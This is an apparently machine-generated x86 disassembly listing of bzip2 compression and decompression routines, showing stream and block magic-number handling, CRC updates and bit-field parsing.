movzx eax [ ebx + eax * 2 + 0x32 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x34 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x36 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x38 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x3e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x40 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x42 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x44 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x46 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x48 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x4e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x50 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x52 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x54 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x56 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x58 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5a ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5c ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x5e ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0x24 ]
movzx eax [ ebx + eax * 2 + 0x60 ]
movzx ecx [ edi + eax ]
add esp 0x40
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
movzx ecx [ edi + eax ]
push ecx
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
mov eax esi
call sub_1001ab59
pop ecx
pop ecx
jmp r-xdata
sub_1001c66c
push ecx
push ebx
push esi
mov esi eax
push edi
mov edi [ esi + 0x44 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x44 ]
cmp [ esi + 0x26c ] 0x1
push 0x8
mov [ esi + 0x2c ] eax
pop edi
jne r-xdata
lea eax [ esi + 0x260 ]
mov edx [ eax ]
not edx
lea ecx [ esi + 0x264 ]
mov [ eax ] edx
mov eax [ ecx ]
rol eax 0x1
xor eax edx
mov [ ecx ] eax
mov ecx [ esi + 0x26c ]
cmp ecx 0x1
jle r-xdata
cmp [ esi + 0x44 ] ebx
jle r-xdata
push edi
push 0x42
pop ecx
mov eax esi
mov [ esi + 0x25c ] ebx
mov [ esi + 0x258 ] ebx
call sub_1001ab59
pop ecx
push edi
push 0x5a
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x68
pop ecx
call sub_1001ab59
mov al [ esi + 0x270 ]
add al 0x30
pop ecx
movzx ecx al
push edi
mov eax esi
call sub_1001ab59
pop ecx
cmp [ esi + 0x268 ] 0x2
jl r-xdata
mov [ esi + 0x4c ] ebx
cmp [ esp + 0x14 ] bl
je r-xdata
push edi
push 0x31
pop ecx
mov eax esi
call sub_1001ab59
pop ecx
push edi
push 0x41
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x59
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x26
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x53
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x59
pop ecx
call sub_1001ab59
mov ebx [ esi + 0x260 ]
pop ecx
call sub_1001abb4
push 0x1
xor ecx ecx
call sub_1001ab59
pop ecx
mov ecx [ esi + 0x1c ]
push 0x18
call sub_1001ab59
pop ecx
call sub_1001abf1
call sub_1001ad87
xor ebx ebx
mov edi esi
call sub_1001fb58
push edi
push eax
push edx
push ecx
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x18
pop edi
pop esi
pop ebx
pop ecx
retn
push edi
push 0x17
pop ecx
mov eax esi
call sub_1001ab59
pop ecx
push edi
push 0x72
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x45
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x38
pop ecx
call sub_1001ab59
pop ecx
push edi
push 0x50
pop ecx
call sub_1001ab59
pop ecx
push edi
mov ecx 0x90
call sub_1001ab59
lea edi [ esi + 0x264 ]
mov ebx [ edi ]
pop ecx
call sub_1001abb4
cmp [ esi + 0x268 ] 0x2
jl r-xdata
cmp [ esi + 0x25c ] 0x0
jle r-xdata
push [ edi ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
lea eax [ esi + 0x258 ]
mov ecx [ esi + 0x4c ]
mov bl [ eax + 0x3 ]
mov edx [ esi + 0x2c ]
mov [ ecx + edx ] bl
inc [ esi + 0x4c ]
shl [ eax ] 0x8
add [ esi + 0x25c ] 0xfffffff8
cmp [ esi + 0x25c ] 0x0
jg r-xdata
sub_1001c83f
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
push esi
mov esi [ ebx ]
xor ecx ecx
push edi
cmp eax 0xa
jne r-xdata
mov ecx [ ebx + 0xfa14 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + 0xfa18 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebx + 0xfa1c ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ebx + 0xfa20 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebx + 0xfa24 ]
mov [ ebp - 0x44 ] ecx
mov ecx [ ebx + 0xfa28 ]
mov [ ebp - 0x50 ] ecx
mov ecx [ ebx + 0xfa2c ]
mov [ ebp - 0x64 ] ecx
mov ecx [ ebx + 0xfa30 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebx + 0xfa34 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ ebx + 0xfa38 ]
mov [ ebp - 0x54 ] ecx
mov ecx [ ebx + 0xfa3c ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebx + 0xfa40 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebx + 0xfa44 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ ebx + 0xfa48 ]
mov [ ebp - 0x74 ] ecx
mov ecx [ ebx + 0xfa4c ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebx + 0xfa50 ]
mov [ ebp - 0x80 ] ecx
mov ecx [ ebx + 0xfa54 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebx + 0xfa58 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebx + 0xfa5c ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xfa60 ]
mov [ ebp - 0x70 ] ecx
mov ecx [ ebx + 0xfa64 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebx + 0xfa68 ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebx + 0xfa6c ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebx + 0xfa70 ]
add eax 0xfffffff6
mov [ ebp - 0x4c ] ecx
cmp eax 0x28
ja r-xdata
mov [ ebx + 0xfa14 ] ecx
mov [ ebx + 0xfa18 ] ecx
mov [ ebx + 0xfa1c ] ecx
mov [ ebx + 0xfa20 ] ecx
mov [ ebx + 0xfa24 ] ecx
mov [ ebx + 0xfa28 ] ecx
mov [ ebx + 0xfa2c ] ecx
mov [ ebx + 0xfa30 ] ecx
mov [ ebx + 0xfa34 ] ecx
mov [ ebx + 0xfa38 ] ecx
mov [ ebx + 0xfa3c ] ecx
mov [ ebx + 0xfa40 ] ecx
mov [ ebx + 0xfa44 ] ecx
mov [ ebx + 0xfa48 ] ecx
mov [ ebx + 0xfa4c ] ecx
mov [ ebx + 0xfa50 ] ecx
mov [ ebx + 0xfa54 ] ecx
mov [ ebx + 0xfa58 ] ecx
mov [ ebx + 0xfa5c ] ecx
mov [ ebx + 0xfa60 ] ecx
mov [ ebx + 0xfa64 ] ecx
mov [ ebx + 0xfa68 ] ecx
mov [ ebx + 0xfa6c ] ecx
mov [ ebx + 0xfa70 ] ecx
push 0xfa1
call sub_100196de
mov edi 0xff
jmp [ eax * 4 + jump_table_1001e667 ]
mov [ ebx + 0x4 ] 0xa
jmp r-xdata
mov [ ebx + 0x4 ] 0xb
jmp r-xdata
mov [ ebx + 0x4 ] 0xc
jmp r-xdata
mov [ ebx + 0x4 ] 0xd
jmp r-xdata
mov [ ebx + 0x4 ] 0xe
jmp r-xdata
mov [ ebx + 0x4 ] 0xf
jmp r-xdata
mov [ ebx + 0x4 ] 0x10
jmp r-xdata
mov [ ebx + 0x4 ] 0x11
jmp r-xdata
mov [ ebx + 0x4 ] 0x12
jmp r-xdata
mov [ ebx + 0x4 ] 0x13
jmp r-xdata
mov [ ebx + 0x4 ] 0x14
jmp r-xdata
mov [ ebx + 0x4 ] 0x15
jmp r-xdata
mov [ ebx + 0x4 ] 0x16
jmp r-xdata
mov [ ebx + 0x4 ] 0x17
jmp r-xdata
mov [ ebx + 0x4 ] 0x18
jmp r-xdata
mov [ ebx + 0x4 ] 0x19
jmp r-xdata
mov [ ebx + 0x4 ] 0x1a
jmp r-xdata
mov [ ebx + 0x4 ] 0x1b
jmp r-xdata
mov [ ebx + 0x4 ] 0x1c
jmp r-xdata
mov [ ebx + 0x4 ] 0x1d
jmp r-xdata
mov [ ebx + 0x4 ] 0x1e
jmp r-xdata
mov [ ebx + 0x4 ] 0x1f
jmp r-xdata
mov [ ebx + 0x4 ] 0x20
jmp r-xdata
mov [ ebx + 0x4 ] 0x23
jmp r-xdata
mov [ ebx + 0x4 ] 0x22
jmp r-xdata
mov [ ebx + 0x4 ] 0x21
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x24
jmp r-xdata
mov [ ebx + 0x4 ] 0x25
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x26
jmp r-xdata
mov [ ebx + 0x4 ] 0x27
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebx + 0x4 ] 0x28
jmp r-xdata
mov [ ebx + 0x4 ] 0x29
jmp r-xdata
mov [ ebx + 0x4 ] 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] 0x2b
jmp r-xdata
mov [ ebx + 0x4 ] 0x2c
jmp r-xdata
mov [ ebx + 0x4 ] 0x2d
jmp r-xdata
mov [ ebx + 0x4 ] 0x2e
jmp r-xdata
mov [ ebx + 0x4 ] 0x2f
jmp r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov [ ebx + 0x4 ] 0x31
jmp r-xdata
mov [ ebx + 0x4 ] 0x32
jmp r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x3
jl r-xdata
cmp [ ebx + 0x20 ] 0xf
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x5
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x42
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x5a
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x68
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp eax 0x31
mov [ ebx + 0x24 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x17
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x41
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x26
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x53
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
and [ ebx + 0x34 ] 0x0
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ebx + 0x1c ]
lea ecx [ eax - 0x8 ]
shr edx cl
add eax 0xfffffff8
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x34 ]
and edx edi
movzx ecx dl
shl eax 0x8
or eax ecx
mov [ ebx + 0x34 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x10 ]
and eax 0x1
dec edx
cmp al 0x1
sete al
inc [ ebp - 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + ecx + 0xd6c ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
cmp al 0x1
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x3 ]
shr eax cl
add edx 0xfffffffd
mov [ ebx + 0x20 ] edx
and eax 0x7
cmp eax 0x2
mov [ ebp - 0x44 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0xf ]
shr eax cl
add edx 0xfffffff1
mov [ ebx + 0x20 ] edx
and eax 0x7fff
cmp eax 0x1
mov [ ebp - 0x50 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x5 ]
shr eax cl
add edx 0xfffffffb
mov [ ebx + 0x20 ] edx
and eax 0x1f
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
or ecx eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebx + 0x1c ]
xor esi esi
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x14 ]
inc esi
shl esi cl
dec esi
and eax esi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x72
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x45
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x38
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x50
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x90
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
